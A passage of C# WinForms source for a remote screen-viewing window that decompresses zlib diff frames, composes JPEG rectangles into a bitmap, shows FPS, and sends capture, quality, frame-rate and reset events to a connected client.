                                byte[] jpegData = new byte[rectData.jpegSize];
                                if (ms.Read(jpegData, 0, rectData.jpegSize) != rectData.jpegSize)
                                {
                                    throw new InvalidDataException($"差异帧JPEG读取失败: index={i}");
                                }

                                using (var jpegMs = new MemoryStream(jpegData))
                                using (var rectBitmap = new Bitmap(jpegMs))
                                {
                                    graphics.DrawImage(rectBitmap,
                                        rectData.rect.left,
                                        rectData.rect.top,
                                        rectWidth,
                                        rectHeight);
                                }
                            }
                        }

                        uiBitmap = new Bitmap(_decodeBitmap);
                    }
                }

                if (missingBaseFrame)
                {
                    RequestDecodeResync("后台解码缺少基础帧");
                    return;
                }
                composeMs = stageWatch.ElapsedMilliseconds;

                if (_decodeStopping)
                {
                    uiBitmap?.Dispose();
                    return;
                }
                _lastDecodedSequence = header.sequence;
                PostDecodedBitmap(uiBitmap);
                RecordFrameProcessStats(false, header, header.originalSize, compressedData.Length, header.rectCount,
                    processWatch.ElapsedMilliseconds, zlibMs, 0, composeMs);
            }
            catch (Exception ex)
            {
                RecordFrameProcessFailure();
                RequestDecodeResync("差异帧后台解码失败");
                Console.WriteLine($"[高速屏幕] 解析差异帧失败: {ex.Message}, {FormatV2Header(header)}");
            }
        }
        /// <summary>
        /// 解压zlib数据（修复：自定义方法）
        /// </summary>
        private byte[] DecompressZlib(byte[] compressedData, int expectedSize)
        {
            if (compressedData == null || compressedData.Length <= 2 ||
                expectedSize <= 0 || expectedSize > SCREEN2_CONSTANTS.MAX_ORIGINAL_PAYLOAD_SIZE)
            {
                return null;
            }

            try
            {
                // zlib格式：前2字节是zlib头，后面是deflate压缩数据。
                // 不使用 CopyTo()，按 expectedSize 做硬上限，避免畸形压缩流先撑爆内存。
                using (var input = new MemoryStream(compressedData, 2, compressedData.Length - 2))
                using (var deflate = new DeflateStream(input, CompressionMode.Decompress))
                using (var output = new MemoryStream(Math.Min(expectedSize, 81920)))
                {
                    byte[] buffer = new byte[81920];
                    int totalRead = 0;
                    while (true)
                    {
                        int read = deflate.Read(buffer, 0, buffer.Length);
                        if (read <= 0)
                        {
                            break;
                        }

                        if (totalRead > expectedSize - read ||
                            totalRead > SCREEN2_CONSTANTS.MAX_ORIGINAL_PAYLOAD_SIZE - read)
                        {
                            Console.WriteLine($"[高速屏幕] zlib解压超过上限: expected={expectedSize}, current={totalRead}, read={read}");
                            return null;
                        }

                        output.Write(buffer, 0, read);
                        totalRead += read;
                    }

                    if (totalRead != expectedSize)
                    {
                        Console.WriteLine($"[高速屏幕] zlib解压长度不匹配: expected={expectedSize}, actual={totalRead}");
                        return null;
                    }

                    return output.ToArray();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[高速屏幕] zlib解压失败: {ex.Message}");
                return null;
            }
        }

        /// <summary>
        /// 更新FPS统计
        /// </summary>
        private void UpdateFps()
        {
            _frameCount++;

            if (_fpsStopwatch.ElapsedMilliseconds >= 1000)
            {
                _currentFps = _frameCount / ((float)_fpsStopwatch.ElapsedMilliseconds / 1000f);
                _frameCount = 0;
                _fpsStopwatch.Restart();
            }
        }

        /// <summary>
        /// 定时器更新UI
        /// </summary>
        private void Timer1_Tick(object sender, EventArgs e)
        {
            labelFps.Text = $"FPS: {_currentFps:F1}";
            MaybeReportFrameStats(false);
        }

        public void StartCapture()
        {
            if (IsDisposed)
            {
                return;
            }

            if (InvokeRequired)
            {
                BeginInvoke(new Action(StartCapture));
                return;
            }

            if (_currentQuality <= 0)
            {
                _currentQuality = SCREEN2_CONSTANTS.DEFAULT_JPEG_QUALITY;
            }
            if (_targetFps <= 0)
            {
                _targetFps = SCREEN2_CONSTANTS.DEFAULT_FPS;
            }

            // 先发送质量和帧率设置，确保客户端使用正确的初始值，再开始捕获。
            SendEvent(SCREEN2_EVENT_ID.CHANGE_QUALITY, _currentQuality);
            SendEvent(SCREEN2_EVENT_ID.CHANGE_FPS, _targetFps);
            SendEvent(SCREEN2_EVENT_ID.START_CAPTURE);

            btnStart.Enabled = false;
            btnStop.Enabled = true;
        }

        /// <summary>
        /// 开始按钮点击
        /// </summary>
        private void btnStart_Click(object sender, EventArgs e)
        {
            StartCapture();
        }

        /// <summary>
        /// 停止按钮点击
        /// </summary>
        private void btnStop_Click(object sender, EventArgs e)
        {
            SendEvent(SCREEN2_EVENT_ID.STOP_CAPTURE);
            btnStart.Enabled = true;
            btnStop.Enabled = false;
        }

        /// <summary>
        /// 质量改变
        /// </summary>
        private void comboBoxQuality_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (comboBoxQuality.SelectedItem != null)
            {
                _currentQuality = int.Parse(comboBoxQuality.SelectedItem.ToString());
                SendEvent(SCREEN2_EVENT_ID.CHANGE_QUALITY, _currentQuality);
            }
        }

        /// <summary>
        /// 帧率改变
        /// </summary>
        private void comboBoxFps_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (comboBoxFps.SelectedItem != null)
            {
                _targetFps = int.Parse(comboBoxFps.SelectedItem.ToString());
                SendEvent(SCREEN2_EVENT_ID.CHANGE_FPS, _targetFps);
            }
        }

        /// <summary>
        /// 重置按钮点击
        /// </summary>
        private void btnReset_Click(object sender, EventArgs e)
        {
            SendEvent(SCREEN2_EVENT_ID.RESET_SCREEN);

            lock (_frameQueueLock)
            {
                _pendingFrames.Clear();
                _resyncPending = false;
                _resyncRequestQueued = false;
                _lastDecodedSequence = 0;
            }

            Bitmap bitmapToDispose;
            lock (_bitmapLock)
            {
                bitmapToDispose = _currentBitmap;
                _currentBitmap = null;
                pictureEdit1.Image = null;
            }
            bitmapToDispose?.Dispose();
            ClearPendingUiBitmap();
            ClearDecodeBitmap();

            // 如果第一次第一帧失败，客户端捕获线程会退出，此时 RESET_SCREEN 不会自动重启。
            // 将 StartCapture 排到 UI 队列尾部，确保重置包先发出，再重新请求首帧。
            BeginInvoke(new Action(StartCapture));
        }


    }
}